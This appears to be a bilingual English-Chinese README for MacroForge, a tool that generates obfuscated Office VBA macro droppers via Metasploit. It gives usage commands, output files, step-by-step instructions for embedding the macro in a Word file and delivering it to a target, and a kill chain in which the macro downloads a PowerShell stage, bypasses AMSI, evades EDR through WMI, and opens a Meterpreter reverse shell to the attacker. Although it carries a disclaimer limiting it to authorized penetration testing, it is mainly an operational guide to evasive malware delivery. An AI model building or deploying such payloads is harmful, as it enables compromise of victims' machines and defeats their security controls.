# MacroForge

Obfuscated VBA Macro Payload Generator for authorized penetration testing.
用于授权渗透测试的混淆 VBA 宏 Payload 生成器。

Automates the creation of staged, AV-evasive Office macro payloads using Metasploit.
基于 Metasploit 自动生成分阶段、免杀 Office 宏文档。

## Features / 功能特性

- **Caesar cipher obfuscation / Caesar 密码混淆** — all sensitive strings encoded, shift randomized per run / 所有敏感字符串编码存储，每次运行 shift 值随机
- **Randomized identifiers / 随机化标识符** — function names, variable names, temp filenames all random / 函数名、变量名、临时文件名全部随机生成
- **WMI execution / WMI 执行** — breaks `WINWORD.exe → powershell.exe` parent-child chain / 断开 Word 到 PowerShell 的父子进程链，绕过 EDR
- **AMSI bypass / AMSI 绕过** — disables PowerShell in-memory scanning / 禁用 PowerShell 内存扫描
- **Staged delivery / 分阶段投递** — document contains only an obfuscated downloader, no shellcode / 文档仅含混淆下载器，不包含 shellcode
- **Cross-platform / 跨平台** — works on Windows and Kali Linux / 支持 Windows 和 Kali Linux
- **4 payload types / 4 种载荷** — `reverse_tcp` / `reverse_https` / `reverse_http` / `shell_tcp`
- **x86 & x64** support / 支持 x86 和 x64 架构

## Requirements / 环境要求

- Python 3.6+
- Metasploit Framework（auto-detected on Windows and Kali / 自动检测路径）

## Quick Start / 快速开始

```bash
# Generate all files with defaults (x64, reverse_tcp, port 4444)
# 默认生成全套文件（x64, reverse_tcp, 端口 4444）
python MacroForge.py --lhost 10.10.16.7

# Generate + auto-start HTTP server
# 生成后自动启动 HTTP 服务
python MacroForge.py --lhost 10.10.16.7 --serve

# Generate + auto-start HTTP server + msfconsole handler
# 生成后自动启动 HTTP 服务 + Metasploit 监听
python MacroForge.py --lhost 10.10.16.7 --serve --listen
```

## Usage / 用法

```
python MacroForge.py --lhost <IP> [options]

Required / 必填:
  --lhost          Your listener IP / 监听 IP 地址

Options / 可选:
  --lport          Listener port / 监听端口 (default: 4444)
  --http-port      HTTP staging port / HTTP 分发端口 (default: 8080)
  --arch           Target arch / 目标架构: x86 | x64 (default: x64)
  --payload        Payload type / 载荷类型 (default: reverse_tcp)
                     reverse_tcp | reverse_https | reverse_http | shell_tcp
  --msf-path       Metasploit path / MSF 路径 (default: auto-detect / 自动检测)
  --output-dir     Output directory / 输出目录 (default: current / 当前目录)
  --shift          Caesar shift / 凯撒偏移量 1-5 (default: random / 随机)
  --serve          Auto-start HTTP server / 自动启动 HTTP 服务
  --listen         Auto-start handler / 自动启动监听 (use with --serve)
```

## Examples / 示例

```bash
# HTTPS payload on port 443
# 使用 HTTPS 载荷，端口 443
python MacroForge.py --lhost 10.10.16.7 --payload reverse_https --lport 443

# x86 target with custom shift
# 针对 x86 目标，指定偏移量
python MacroForge.py --lhost 10.10.16.7 --arch x86 --shift 3

# Custom output directory
# 自定义输出目录
python MacroForge.py --lhost 10.10.16.7 --output-dir ./payload_output

# Specify Metasploit path manually
# 手动指定 Metasploit 路径
python MacroForge.py --lhost 10.10.16.7 --msf-path /opt/metasploit-framework
```

## Output Files / 输出文件

| File / 文件 | Description / 说明 |
|------|-------------|
| `macro.vba` | Obfuscated VBA macro — paste into Word module / 混淆 VBA 宏 — 粘贴到 Word 模块 |
| `rev.ps1` | PowerShell payload with AMSI bypass — hosted on HTTP / 含 AMSI 绕过的 PS 载荷 — 放在 HTTP 服务上 |
| `handler.rc` | Metasploit resource file — one-command listener / MSF 资源文件 — 一键启动监听 |

## Step-by-Step / 操作步骤

1. **Generate payload / 生成载荷**
   ```bash
   python MacroForge.py --lhost 10.10.16.7
   ```

2. **Start HTTP server / 启动 HTTP 服务**（serves `rev.ps1` / 托管 `rev.ps1`）
   ```bash
   python -m http.server 8080
   ```

3. **Start Metasploit handler / 启动 Metasploit 监听**
   ```bash
   msfconsole -r handler.rc
   ```

4. **Create Word document / 创建 Word 文档**
   - Open Word → `Alt+F11` → Insert Module / 打开 Word → `Alt+F11` → 右键插入模块
   - Paste `macro.vba` contents / 粘贴 `macro.vba` 内容
   - Save as `.doc` or `.docm` / 另存为 `.doc` 或 `.docm`

5. **Deliver to target / 投递给目标**

## Kill Chain / 攻击链

```
Target opens Word doc / 目标打开 Word 文档
  → VBA macro fires / VBA 宏触发 (AutoOpen / Document_Open)
  → Caesar-decoded XMLHTTP downloads rev.ps1 / 解码后通过 XMLHTTP 下载 rev.ps1
  → Writes to %TEMP% with random filename / 以随机文件名写入 %TEMP%
  → WMI Win32_Process.Create spawns PowerShell / WMI 启动 PowerShell（父进程为 WMI 而非 Word）
  → AMSI bypass disables PS scanning / AMSI 绕过禁用 PS 扫描
  → Meterpreter shellcode injected in memory / Meterpreter shellcode 注入内存
  → Reverse connection to attacker / 反弹连接到攻击机
```

## Evasion Summary / 免杀技术总结

| Layer / 层级 | Technique / 技术 |
|-------|-----------|
| Document / 文档层 | No shellcode, only obfuscated downloader / 无 shellcode，仅含混淆下载器 |
| Strings / 字符串层 | Caesar cipher with random shift / 随机偏移的凯撒密码 |
| Identifiers / 标识符层 | Randomized function/variable names / 随机化函数名和变量名 |
| Execution / 执行层 | WMI process create (breaks parent-child chain) / WMI 创建进程（断开父子链） |
| PowerShell / PS 层 | AMSI bypass before payload execution / 执行前绕过 AMSI |
| Payload / 载荷层 | In-memory shellcode injection, no file on disk / 内存注入，无落地文件 |

## Disclaimer / 免责声明

This tool is intended for authorized penetration testing and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.

本工具仅用于授权渗透测试和安全研究。未经授权对非自有系统使用本工具属于违法行为。
